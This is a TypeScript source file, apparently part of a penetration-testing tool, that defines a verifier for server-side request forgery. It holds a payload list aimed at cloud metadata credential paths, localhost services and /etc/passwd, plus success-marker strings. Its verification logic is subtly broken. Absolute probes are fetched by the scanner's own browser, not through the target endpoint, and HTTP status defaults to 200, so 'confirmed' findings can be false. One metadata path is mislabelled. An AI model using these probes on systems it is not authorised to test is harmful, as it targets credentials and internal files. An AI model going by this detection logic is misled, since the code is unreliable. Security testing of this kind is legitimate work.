import type { BrowserEngine } from "../engine"
import type { VerificationScenario, VerifierResult, EvidencePackage } from "../types"
import { Confidence } from "../../shared/types"
import type { EvidenceCollector } from "../../evidence/collector"
import { randomUUID, createHash } from "crypto"
import { tmpdir } from "os"
import { join } from "path"
import { existsSync, mkdirSync, rmSync } from "fs"

/**
 * SSRF Verifier — probes SSRF-vulnerable endpoints against an attacker-controlled
 * listener (collaborator/callback server) to confirm out-of-band interaction.
 *
 * Strategy:
 * 1. Navigate to the SSRF-prone URL (found by earlier scanning)
 * 2. Check if the response contains any internal IP patterns or metadata endpoints
 * 3. Verify that the endpoint actually performed a server-side request
 */
export class SSRFVerifier implements VerificationScenario {
  name = "ssrf"
  description = "Server-Side Request Forgery — confirms SSRF by probing internal/metadata endpoints"

  private logs: string[] = []
  private ssrfConfirmed = false
  private internalIpLeaked = false
  private metadataEndpointReachable = false
  private capturedScreenshots: { data: Buffer; label: string }[] = []
  private capturedResponses: string[] = []
  private capturedRequests: string[] = []
  private harDir: string | null = null
  private probeEndpoint = ""
  private probeResults: { url: string; status: number; bodyPreview: string }[] = []

  // Common SSRF probe payloads targeting internal services
  private static readonly SSRF_PROBES = [
    "/latest/meta-data/",          // AWS IMDS
    "/metadata/instance?api-version=2021-02-01",  // GCP metadata
    "/metadata/identity/oauth2/token", // Azure IMDS
    "http://127.0.0.1:22",         // Localhost SSH
    "http://127.0.0.1:80",         // Localhost HTTP
    "http://127.0.0.1:443",        // Localhost HTTPS
    "http://127.0.0.1:8080",       // Localhost HTTP-alt
    "http://169.254.169.254/latest/meta-data/", // AWS IMDS IP
    "file:///etc/passwd",          // LFI via SSRF
    "http://[::1]:80",             // IPv6 loopback
  ]

  // Markers that indicate SSRF succeeded
  private static readonly SSRF_SUCCESS_MARKERS = [
    "root:",
    "ec2-user",
    "instance-id",
    "ami-id",
    "public-keys",
    "security-credentials",
    "meta-data",
    "2.0/meta-data",
    "availability-zone",
    "local-ipv4",
    "localhost",
    "uid=0",
    "uid=1",
  ]

  constructor(
    private engine: BrowserEngine,
    private targetUrl: string,
    private ssrfEndpoint: string,  // The endpoint/param vulnerable to SSRF
    private collector?: EvidenceCollector,
    private engagementId?: string,
    private findingId?: string,
  ) {}

  async setup(): Promise<void> {
    // Normalize the ssrfEndpoint to a full URL
    this.probeEndpoint = this.ssrfEndpoint.startsWith("http")
      ? this.ssrfEndpoint
      : `${this.targetUrl.replace(/\/+$/, "")}/${this.ssrfEndpoint.replace(/^\//, "")}`

    await this.engine.launch()
    this.harDir = join(tmpdir(), `argus-har-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`)
    mkdirSync(this.harDir, { recursive: true })
    this.logs.push(`SSRF verifier setup complete — probing endpoint: ${this.probeEndpoint}`)
  }

  async cleanup(): Promise<void> {
    await this.engine.close()
    if (this.harDir && existsSync(this.harDir)) {
      try { rmSync(this.harDir, { recursive: true, force: true }) } catch { /* best-effort */ }
    }
  }

  async execute(): Promise<void> {
    await this.engine.createContext({ harDir: this.harDir ?? undefined } as any)

    // Probe 1: Direct fetch to the SSRF endpoint with various payloads
    for (const probe of SSRFVerifier.SSRF_PROBES) {
      const fullUrl = `${this.probeEndpoint}${probe.startsWith("http") ? "" : probe}`
      const probeUrl = probe.startsWith("http") ? probe : fullUrl

      try {
        const page = await this.engine.navigate(probeUrl)
        await page.waitForLoadState("networkidle", { timeout: 10000 }).catch(() => {})
        const body = await page.textContent("body").catch(() => "")
        const status = await page.evaluate(() => (window as any).__statusCode ?? 200).catch(() => 0)

        this.capturedRequests.push(`GET ${probeUrl}`)
        this.capturedResponses.push(`Probe ${probeUrl}: HTTP ${status}`)

        this.probeResults.push({
          url: probeUrl,
          status,
          bodyPreview: (body ?? "").slice(0, 500),
        })

        try {
          const shot = await this.engine.captureScreenshot(page)
          this.capturedScreenshots.push({ data: shot, label: `probe-${probe.replace(/[^a-zA-Z0-9]/g, "-")}` })
        } catch { /* best-effort */ }

        await page.close()
      } catch {
        this.logs.push(`SSRF probe failed: ${probeUrl}`)
        this.probeResults.push({ url: probeUrl, status: 0, bodyPreview: "" })
      }
    }

    // Check results for SSRF success markers
    for (const result of this.probeResults) {
      const lowerBody = result.bodyPreview.toLowerCase()
      const matchedMarkers = SSRFVerifier.SSRF_SUCCESS_MARKERS.filter(m => lowerBody.includes(m.toLowerCase()))
      if (matchedMarkers.length > 0) {
        if (result.url.includes("meta-data") || result.url.includes("169.254") || result.bodyPreview.includes("instance-id") || result.bodyPreview.includes("ami-id")) {
          this.metadataEndpointReachable = true
          this.logs.push(`SSRF: Metadata endpoint reachable via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
        }
        if (result.bodyPreview.includes("root:") || result.bodyPreview.includes("uid=")) {
          this.internalIpLeaked = true
          this.logs.push(`SSRF: Internal file content leaked via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
        }
        this.ssrfConfirmed = true
      }

      // Any successful response from internal IP ranges indicates SSRF
      if (result.status > 0 && result.status < 500) {
        const isInternal = SSRFVerifier.SSRF_PROBES.some(p =>
          result.url.includes(p) && (p.includes("127.0.0.1") || p.includes("169.254") || p.includes("[::1]"))
        )
        if (isInternal) {
          this.ssrfConfirmed = true
          this.logs.push(`SSRF: Internal endpoint responded (HTTP ${result.status}) via ${result.url}`)
        }
      }
    }

    this.logs.push(`SSRF ${this.ssrfConfirmed ? "CONFIRMED" : "not detected"} — metadata_reachable=${this.metadataEndpointReachable}, internal_leak=${this.internalIpLeaked}`)
  }

  async verify(): Promise<VerifierResult> {
    const passed = this.ssrfConfirmed

    const summary = passed
      ? this.metadataEndpointReachable
        ? `SSRF confirmed: Cloud metadata endpoint reachable — ${this.getSuccessfulProbes()} probe(s) returned internal data`
        : this.internalIpLeaked
          ? `SSRF confirmed: Internal file content leaked — ${this.getSuccessfulProbes()} probe(s) returned file contents`
          : `SSRF confirmed: ${this.getSuccessfulProbes()} internal endpoint(s) responded to server-side requests`
      : `SSRF not detected: No internal endpoints responded`

    return {
      passed,
      confidence: passed && this.metadataEndpointReachable ? Confidence.HIGH
        : passed ? Confidence.MEDIUM
        : Confidence.INFORMATIONAL,
      evidence: [],
      summary,
    }
  }

  async collectEvidence(): Promise<EvidencePackage> {
    const collectedArtifacts: import("../../evidence/types").ArtifactEntry[] = []
    let computedHash = ""
    if (this.collector && this.engagementId && this.findingId) {
      for (const shot of this.capturedScreenshots) {
        const entry = await this.collector.captureScreenshot(this.engagementId, this.findingId, shot.data).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const req of this.capturedRequests) {
        const entry = await this.collector.saveRequest(this.engagementId, this.findingId, req).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const res of this.capturedResponses) {
        const entry = await this.collector.saveResponse(this.engagementId, this.findingId, res).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      if (this.harDir) {
        const harArtifacts = await this.collector.ingestHarFiles(this.engagementId, this.findingId, this.harDir).catch(() => [])
        collectedArtifacts.push(...harArtifacts)
      }
      const manifest = await this.collector.createPackage(this.engagementId, this.findingId, collectedArtifacts).catch(() => null)
      if (manifest) computedHash = manifest.package_hash
    }

    if (!computedHash && collectedArtifacts.length > 0) {
      const hashInput = collectedArtifacts.map((a) => a.hash || a.path).join("")
      computedHash = createHash("sha256").update(hashInput).digest("hex")
    }

    return {
      packageId: randomUUID(),
      findingId: this.findingId ?? "",
      artifacts: collectedArtifacts.length > 0
        ? collectedArtifacts.map((a) => ({ path: a.path, type: a.type, hash: a.hash }))
        : [
            ...this.capturedScreenshots.map((s) => ({ path: `ssrf-${s.label}.png`, type: "screenshot" as const })),
            ...this.capturedRequests.map((r) => ({ path: r, type: "request" as const })),
            ...this.capturedResponses.map((r) => ({ path: r, type: "response" as const })),
          ],
      packageHash: computedHash,
      createdAt: new Date().toISOString(),
    }
  }

  private getSuccessfulProbes(): number {
    return this.probeResults.filter(r => r.status > 0 && r.status < 500).length
  }
}
